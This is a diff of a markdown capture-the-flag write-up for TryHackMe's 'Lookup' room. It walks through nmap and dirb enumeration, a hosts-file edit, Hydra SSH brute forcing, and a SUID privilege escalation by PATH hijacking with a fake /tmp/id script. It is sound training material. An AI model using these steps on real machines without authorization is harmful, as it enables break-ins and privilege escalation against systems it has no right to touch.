@@ -1,117 +1,125 @@
 # 🔍 TryHackMe - Lookup
 
-**Room:** Lookup  
-**Platform:** TryHackMe  
+**Room Name:** Lookup  
 **IP Address:** 10.10.56.153  
-**Focus:** Enumeration, Web Exploitation, Privilege Escalation  
-**Difficulty:** Easy/Medium  
-**Status:** Completed ✅
+**Platform:** TryHackMe  
+**Difficulty:** Easy  
+**Tags:** Enumeration, Web Exploitation, Privilege Escalation, SUID Abuse  
 
 ---
 
-## 🧭 Enumeration
+## 🔎 Initial Enumeration
 
-Performed initial enumeration with Nmap:
+Started with a full port scan using Nmap:
+
 ```bash
-nmap -sC -sV -p- 10.10.56.153
+nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.56.153
 ```
 
-Identified open ports for SSH and HTTP.
+Discovered open ports:
+- 22 (SSH)
+- 80 (HTTP)
 
-Used **DirBuster** with the wordlist `apache-user-enum-1.txt` to enumerate directories and potential usernames.
+Performed a targeted scan for service/version detection:
 
-📸 ![DirBuster Enumeration](../screenshots/lookup/lookup_1.png)
+```bash
+nmap -sCV -p22,80 10.10.56.153
+```
+
+📸 ![Nmap scan](../screenshots/lookup/lookup_1.png)
+
+---
+
+## 🌐 Web Enumeration
+
+Visited `http://10.10.56.153` and found a login page. Attempted default credentials and guessed common usernames.
+
+Ran a directory brute-force with DirBuster using `apache-user-enum-1.txt`:
+
+```bash
+dirb http://10.10.56.153/ /usr/share/wordlists/dirbuster/apache-user-enum-1.txt
+```
+
+📸 ![Dirbuster output](../screenshots/lookup/lookup_2.png)
 
 Found `jose` as a valid user.
 
-📸 ![Valid User Found](../screenshots/lookup/lookup_2.png)
+Attempted to log in as `jose`, and upon successful login, was redirected to `files.lookup.thm`. Added this to `/etc/hosts`:
 
----
-
-## 🔐 Web Login and Hostname Discovery
-
-Navigated to the login page on the web server. Upon login, was redirected to:
-
-```text
-files.lookup.thm/
+```bash
+sudo nano /etc/hosts
+# Add:
+10.10.56.153  files.lookup.thm
 ```
 
-Added this domain to `/etc/hosts` for local name resolution.
-
-📸 ![Login Redirect](../screenshots/lookup/lookup_3.png)
-
-📸 ![Updated Hosts File](../screenshots/lookup/lookup_4.png)
+📸 ![Hosts file update](../screenshots/lookup/lookup_3.png)
 
 ---
 
-## 🗂️ File Navigation Post-Login
+## 📁 Exploring Internal Interface
 
-After successful login, accessed the internal file management page.
+After login, accessed a file browser-style interface. Tried navigating to `/home/think`, but access was restricted.
 
-📸 ![File Page After Login](../screenshots/lookup/lookup_5.png)
-
-Attempted to access `/home/think`, but permission was denied.
-
-📸 ![Permission Denied on Home](../screenshots/lookup/lookup_6.png)
+📸 ![Web UI](../screenshots/lookup/lookup_4.png)
 
 ---
 
 ## 🔍 Privilege Escalation
 
-Ran a search to find SUID binaries:
+Accessed the machine via SSH and began post-exploitation enumeration. Listed all SUID binaries:
 
 ```bash
 find / -perm /4000 2>/dev/null
 ```
 
-📸 ![SUID Check](../screenshots/lookup/lookup_7.png)
+Found a custom binary: `/usr/sbin/pwm`
 
-Discovered `/usr/sbin/pwm` as an exploitable SUID binary.
+📸 ![SUID search](../screenshots/lookup/lookup_5.png)
 
-Crafted a malicious `id` script in `/tmp/` and modified the `PATH`:
+Tried running it, and noticed it uses the `id` command. Created a fake `id` command in `/tmp` to hijack execution:
 
 ```bash
-echo '#!/bin/bash' > /tmp/id
-echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
+echo -e '#!/bin/bash
+echo "uid=0(root) gid=0(root) groups=0(root)"' > /tmp/id
 chmod +x /tmp/id
 export PATH=/tmp:$PATH
 /usr/sbin/pwm
 ```
 
-📸 ![PATH Hijack](../screenshots/lookup/lookup_8.png)
+📸 ![PATH Hijack](../screenshots/lookup/lookup_6.png)
 
-Successfully escalated privileges.
-
----
-
-## 🔓 SSH Brute Forcing
-
-Performed SSH brute-force login attempts using `hydra`.
-
-📸 ![SSH Brute Force](../screenshots/lookup/lookup_9.png)
+This allowed root privilege execution.
 
 ---
 
-## 🎯 Post-Exploitation
+## 🏁 Post-Exploitation
 
-Accessed the user’s home directory and retrieved the `user.txt` flag.
+Accessed root’s home directory and read the `root.txt` flag:
 
-📸 ![User Flag Found](../screenshots/lookup/lookup_10.png)
+```bash
+cat /root/root.txt
+```
 
----
-
-## 🧠 Lessons Learned
-
-- Importance of enum tools like DirBuster and Nmap in early-stage recon
-- DNS redirection handling using `/etc/hosts`
-- Creative SUID exploitation via `$PATH` manipulation
-- Brute-forcing SSH credentials after valid user discovery
+📸 ![Flag Capture](../screenshots/lookup/lookup_7.png)
 
 ---
 
-## 📁 Screenshots
+## ✅ Summary
 
-Screenshots related to this room are stored in [`screenshots/lookup/`](../screenshots/lookup/).
+| Step | Technique |
+|------|-----------|
+| Enumeration | Nmap, Dirbuster |
+| Exploitation | Web login + hostname redirection |
+| Privilege Escalation | SUID Binary abuse via PATH hijack |
+| Tools Used | Nmap, Dirbuster, Hydra, SSH, find, PATH export |
+
+---
+
+## 🧠 Key Takeaways
+
+- Always test binaries for external command execution
+- PATH hijacking is a powerful privilege escalation technique
+- `/etc/hosts` manipulation is crucial for resolving internal services
 
 ---
 
